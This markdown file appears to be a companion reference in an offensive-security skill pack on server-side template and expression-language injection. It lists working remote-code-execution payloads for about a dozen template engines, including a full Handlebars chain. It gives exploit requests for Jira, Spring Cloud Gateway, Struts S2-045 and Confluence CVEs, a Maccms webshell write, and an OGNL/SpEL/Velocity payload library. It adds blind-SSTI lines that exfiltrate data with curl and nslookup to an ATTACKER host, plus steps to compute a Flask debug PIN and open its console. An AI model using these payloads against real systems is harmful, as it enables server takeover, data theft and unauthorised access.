# SCENARIOS.md — Extended SSTI Scenarios

> Companion to [SKILL.md](./SKILL.md) and [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).
> Covers the engines and product-specific CVEs that the main skill points at. Sections are
> numbered §7–§11 to match the cross-references in `SKILL.md` §0.

---

## §7. ADDITIONAL TEMPLATE ENGINES

The main skill covers Jinja2, FreeMarker, Twig, Velocity, ERB, and Thymeleaf. These are the
rest of the field.

### 7.1 ASP.NET Razor

```razor
@(7*7)                       → 49
@{ var x = "test"; }@x
@System.IO.File.ReadAllText("/etc/passwd")
@(new System.Diagnostics.ProcessStartInfo("cmd","/c whoami"))
```

Razor is compiled server-side. Any user input reaching a `.cshtml` render is direct code
execution. Detection: `@(1+1)` returns `2`; `@{}` blocks execute statements.

### 7.2 Elixir — EEx / LEEx / HEEx

```elixir
<%= 7*7 %>                       → 49          (EEx)
<%= System.cmd("id", []) %>                    (RCE)
<%= :os.cmd('id') %>
```

HEEx (Phoenix LiveView) additionally exposes component state; `<%= %>` in a HEEx template is a
compile-time error but `<%= raw %>` in embedded templates is not. Check which renderer.

### 7.3 PHP — Smarty / Latte / Blade

**Smarty** (delimiters `{ }` by default):
```smarty
{7*7}                                        → 49
{php}echo shell_exec('id');{/php}            (only if {php} tags enabled)
{system('id')}                               (Smarty 3+, function call syntax)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php ...?>",self::clearConfig())}
```

**Latte**:
```latte
{=7*7}
{php system('id')}
```

**Blade** (Laravel) — Blade compiles to PHP, so the sinks are PHP sinks. Blade-specific:
```blade
{{ }}          escaped, but `{!! !!}` is raw
@php echo shell_exec('id'); @endphp
{{ system('id') }}          ← works if the input reaches the compiler, not just the renderer
```
Blade SSTI is rare precisely because Blade compiles to a PHP file that is cached; the risk is
in `@eval`-style helpers and in `Blade::render()` with user input (Laravel < 9.31 — the
`Blade::render()` filename-injection path).

### 7.4 JavaScript — Pug / Handlebars / Nunjucks / EJS / Lodash

| Engine | Probe | RCE |
|---|---|---|
| **Pug** (Jade) | `#{7*7}` → 49 | `#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}` |
| **Handlebars** | `{{7*7}}` → 49 | prototype-chain traversal into `constructor` (see below) |
| **Nunjucks** | `{{7*7}}` → 49 | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |
| **EJS** | `<%= 7*7 %>` → 49 | `<%= global.process.mainModule.require('child_process').execSync('id') %>` |
| **Lodash** (`_.template`) | `<%= 7*7 %>` → 49 | `<%= global.process.mainModule.require('child_process').execSync('id') %>` |
| **Vue** (client) | `{{7*7}}` → 49 in DOM | client-side only; escalate via `constructor` gadget |

**Handlebars RCE chain** (the one worth memorising — no `require` needed inline):
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### 7.5 Universal polyglot probe

One string that trips several engines at once:
```
${{<%[%'"}}%\.
```
Send it; if the response contains a template error, the engine is being evaluated and its
error text usually names itself. Then fingerprint with math (§7.7).

### 7.6 Mathematical fingerprinting

| Probe | `49` means | `7777777` means | Other |
|---|---|---|---|
| `{{7*7}}` | Twig, or Jinja2 (ambiguous) | Jinja2 | literal `{{7*7}}` → not Jinja/Twig |
| `{{7*'7'}}` | Twig (numeric cast) | **Jinja2** (string repeat) | — |
| `${7*7}` | FreeMarker / Velocity / EL | — | `<#assign>` works → FreeMarker |
| `#{7*7}` | Ruby ERB | — | `49` in Ruby only |
| `<%= 7*7 %>` | EJS / ERB / Lodash | — | error names the engine |
| `@(7*7)` | Razor | — | — |
| `{7*7}` | Smarty / Latte | — | `{php}` present → Smarty |

### 7.7 SSTI vs Expression Language (EL) disambiguation

Both use `${...}`. The difference decides your payload set.

| Test | SSTI (FreeMarker/Velocity) | EL injection (Java/SpEL/OGNL) |
|---|---|---|
| `${7*7}` | 49 | 49 — same result, not decisive |
| `${"".getClass()}` | FreeMarker error | works in EL |
| `<#assign x=1>${x}` | works → **FreeMarker** | error |
| `#{...}` | not applicable | works in some EL contexts |
| `${T(java.lang.Runtime)}` | error | **SpEL** (Spring) |
| `${#context}` | — | **OGNL** (Struts) |

**Rule of thumb:** if the target is a Java web framework (Spring, Struts, Confluence, Jira) and
the syntax is `${}`, assume **EL injection**, not template injection. Payload sets differ
completely (§8–§9).

---

## §8. PRODUCT-SPECIFIC CVE CHAINS

### 8.1 Maccms 8.x — PHP template `eval`

```
Endpoint : /index.php/vod/search.html
Param    : wd
Payload  : {if-A:phpinfo()}{endif-A}
```

The template engine evaluates PHP inside the `if` condition. For a webshell write:
```php
{if-A:file_put_contents('shell.php',base64_decode('PD9waHAg...'))}{endif-A}
```
Base64-wrapping defeats string filters that look for `php` or `<`. Confirm by requesting the
written path.

### 8.2 Jira CVE-2019-11581 — Velocity via Contact Administrators

```
Path    : /secure/ContactAdministrators!default.jspa
Fields  : subject / description
Payload : $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')
```

Output lands in the **admin notification email**, not the HTTP response — a blind channel.
Verify in the mail body, or redirect output to a file and read it through another endpoint.

### 8.3 Spring Cloud Gateway — SpEL (CVE-2022-22947)

Actuator route injection. Requires the actuator gateway endpoint to be exposed and writable.

```http
POST /actuator/gateway/routes/newroute HTTP/1.1
Content-Type: application/json

{
  "id": "newroute",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name":"Path","args":{"pattern":"/newroute"}}]
}
```

Then `POST /actuator/gateway/refresh`, then `GET /newroute` and read the `Result` header.
Clean up the route afterwards — leaving it is a second finding.

### 8.4 Struts2 OGNL — S2-045 (CVE-2017-5638)

Content-Type header injection, no body needed.

```http
Content-Type: %{(#_='multipart/form-data').
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
  (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
  (#ognlUtil.getExcludedPackageNames().clear()).
  (#ognlUtil.getExcludedClasses().clear()).
  (#context.setMemberAccess(#dm)))).
  (#cmd='id').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).
  (#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())}
```

The `_memberAccess` swap clears the sandbox. The response body carries the command output.

### 8.5 Confluence OGNL — CVE-2021-26084

```
Path    : /pages/createpage-entervariables.action?SpaceKey=x
Payload : queryString=\u0027%2b#{...}%2b\u0027
```

`\u0027` (single quote) bypasses filters matching the literal `'`. Full chain uses
`ClassLoader` → `Runtime.exec`. Output captured in the response for the non-blind variant.

---

## §9. OGNL / SpEL / EL PAYLOAD LIBRARY

### 9.1 OGNL (Struts, Confluence)

```java
// basic check
%{7*7}
// get Runtime without sandbox clear (may fail on patched versions)
%{@java.lang.Runtime@getRuntime().exec('id')}
// with sandbox clear — see §8.4 for the full preamble
// file read
%{new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()}
// classloader route
%{(#c=@java.lang.Thread@currentThread().getContextClassLoader()).loadClass('java.lang.Runtime')}
```

### 9.2 SpEL (Spring)

```java
${7*7}
// RCE
${T(java.lang.Runtime).getRuntime().exec('id')}
// output capture (exec alone gives no output)
${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'}).getInputStream()))}
// file read
${new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.io.FileInputStream('/etc/passwd')))}
// classloader
${T(org.springframework.cglib.core.ReflectUtils).defineClass('X',T(org.springframework.util.Base64Utils).decodeFromString('...'),T(java.lang.ClassLoader).getSystemClassLoader())}
```

### 9.3 JSP EL

```java
${7*7}
${pageContext.request.getSession().setAttribute('x',1)}
${''.getClass().forName('java.lang.Runtime')}
// EL alone usually cannot exec — chain into a Java sink or use it for file read / SSRF
${pageContext.request.getServletContext().getResourceAsStream('/WEB-INF/web.xml')}
```

### 9.4 Velocity (Java)

```java
#set($x=7*7)$x
#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())
#set($p=$rt.exec('id'))
#set($br=$class.inspect('java.io.BufferedReader').type.getConstructor($class.inspect('java.io.Reader').type).newInstance($class.inspect('java.io.InputStreamReader').type.getConstructor($class.inspect('java.io.InputStream').type).newInstance($p.getInputStream())))
$br.readLine()
```

---

## §10. BLIND SSTI

No output in the response — you still need to confirm and then extract.

### 10.1 Boolean-based

```
Payload A (true)  : {% if 7*7==49 %}X{% endif %}
Payload B (false) : {% if 7*7==50 %}X{% endif %}
```
Difference in response length/content/status → the template is evaluating. Then binary-search
a condition:
```
{% if ''.__class__.__mro__[1].__subclasses__()[N].__name__=='Popen' %}X{% endif %}
```

### 10.2 Time-based

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[N]('sleep 5',shell=True,stdout=-1).communicate() }}
```
Or the engine-native sleep if one exists (`{% set x = ... %}`, Freemarker `<#assign>` with a
loop). Measure with a baseline request; a 5-second delta is the signal.

### 10.3 Out-of-band

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[N]('curl http://ATTACKER/$(id|base64)',shell=True) }}
{{ ''.__class__.__mro__[1].__subclasses__()[N]('nslookup $(whoami).ATTACKER',shell=True) }}
```
DNS is the most reliable channel — egress DNS is rarely filtered. Encode extracted data into
the subdomain label.

### 10.4 Error-based

Deliberately malformed input produces an engine stack trace naming the engine, version, and
sometimes the template path:
```
{{ 7*7
{{ ''.__class__
{$x
```
The stack trace is the fingerprint. It also frequently leaks the **absolute template path** —
useful for a write primitive.

---

## §11. FLASK DEBUG PIN PREREQUISITES

The Werkzeug debugger PIN is computable if you know the inputs. This is not an SSTI by itself
but it is the escalation when **debug mode is on** and you have any file-read primitive.

**The PIN is derived from (Werkzeug ≥ 2.0):**

| Input | How to obtain |
|---|---|
| `username` | the user running the Flask process — read `/proc/self/environ` (`USER`), or `getpass.getuser()` equivalent |
| `modname` | usually `flask.app` |
| `getattr(app, "__name__", ...)` | usually `Flask` |
| `getattr(mod, "__file__", ...)` | path to `flask/app.py` — known if you know the install layout (e.g. `/usr/local/lib/python3.11/site-packages/flask/app.py`) |
| `uuid.getnode()` | **MAC address as int** — read `/sys/class/net/eth0/address` and drop the colons |
| `machine-id` | XOR of `/etc/machine-id` and `/proc/sys/kernel/random/boot_id`; for **containers** also `/proc/self/cgroup` (the last segment after the final `/`) |

**Container nuance (important):** in Docker/K8s, `machine-id` combines `boot_id` with the
cgroup path. `boot_id` changes on every restart, so the PIN changes too. Get all three files in
one go.

**Where SSTI helps:** the classic route is `{{ ''.__class__.__mro__[1].__subclasses__() }}` to
reach a file-read primitive, then read `/sys/class/net/eth0/address`, `/etc/machine-id`,
`/proc/self/cgroup`, and `/proc/self/environ`, then compute the PIN locally with the
`werkzeug.security.gen_pin` algorithm, then open
`/console` and authenticate.

**If debug is off**, none of this applies — the console does not exist. Confirm the debugger
page (`/console`) returns 200 before investing in PIN computation.

---

## §12. QUICK REFERENCE — SCENARIO → ENGINE → PAYLOAD

| Scenario | Engine | First probe |
|---|---|---|
| Flask/Jinja2 app, any user input in a template | Jinja2 | `{{7*7}}` then `{{7*'7'}}` |
| Java Spring app, `${}` reflected | SpEL | `${7*7}` then `${T(java.lang.Runtime)}` |
| Struts2 app, any header | OGNL | `%{7*7}` then §8.4 |
| Confluence, `createpage-entervariables` | OGNL | `\u0027` bypass, §8.5 |
| Jira, contact admin form | Velocity | §8.2 |
| PHP CMS with `{if-…}` syntax | PHP eval | `{if-A:phpinfo()}{endif-A}` |
| Node + Pug | Pug | `#{7*7}` |
| Node + Handlebars/`compile()` | Handlebars | `{{7*7}}` then §7.4 chain |
| Node + Nunjucks | Nunjucks | `{{7*7}}` then `range.constructor` |
| .NET MVC, `@` reflected | Razor | `@(7*7)` |
| Phoenix LiveView | EEx/HEEx | `<%= 7*7 %>` |
| Ruby on Rails view | ERB | `#{7*7}` |

---

## §13. RELATED

- [SKILL.md](./SKILL.md) — core chains, Jinja2/FreeMarker/Twig/Velocity/ERB/Thymeleaf
- [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md) — fingerprint decision tree and per-engine payloads
- [expression-language-injection](../expression-language-injection/SKILL.md) — when the bug is EL, not template
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — the sink most chains end at
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — the alternative Java route
